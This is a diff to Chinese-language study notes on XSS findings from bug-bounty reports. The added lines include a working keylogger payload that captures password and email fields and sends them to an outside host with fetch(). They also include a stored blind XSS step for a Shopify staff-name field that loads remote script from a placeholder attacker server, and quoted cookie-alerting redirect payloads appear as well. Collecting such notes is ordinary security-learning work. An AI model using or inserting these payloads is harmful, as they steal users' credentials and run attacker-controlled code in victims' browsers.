@@ -104,7 +104,27 @@ https://wx.zsxq.com/columns/48884815425228
 标题是：通过观察响应值以及**cookie走私**来实现的xss
 本来cookie中的字段以分号相隔为不同的cookie字段，但是这里服务器把空格也当成了分隔符，当攻击者用空格进行构造cookie的时候，服务器没有进行安全处理直接将cookie字段反射到页面造成xss
 后续还有账号接管操作还没分析
+键盘记录器payload
+```
+
+setTimeout(function () {
+    {
+    var a = document.getElementsByName('password')[0];
+    var b = document.getElementsByName('email')[0];
+    
+    function f() {
+        fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
+    }
+    a.form.onclick = f;
+    a.onchange = f;
+    b.onchange = f;
+    a.oninput = f;
+    b.oninput = f;
+}, 1000);
+```
 思考：新的漏洞点，关注cookie等可能的header头也会有xss反射点
+
+
 
 # 12.路径重定向的xss
 https://hackerone.com/reports/260744
@@ -129,3 +149,11 @@ location: //x:1/://dev.twitter.com/javascript:alert(document.cookie)
 <p>You should be redirected automatically to target URL: <a href="javascript:alert(document.cookie)">javascript:alert(document.cookie)</a>.  If not click the link.
 ```
 思考：提示重定向的页面也可以造成xss
+
+# 13.jquery，存储型盲xss
+访问 https://your-store.myshopify.com/admin/settings/account。
+添加一个新的员工账号。
+在填写名字和姓氏字段时，输入以下payload（恶意代码）：
+```
+<script>$.getScript("https://yourvps.com/xss.js")</script>
+```
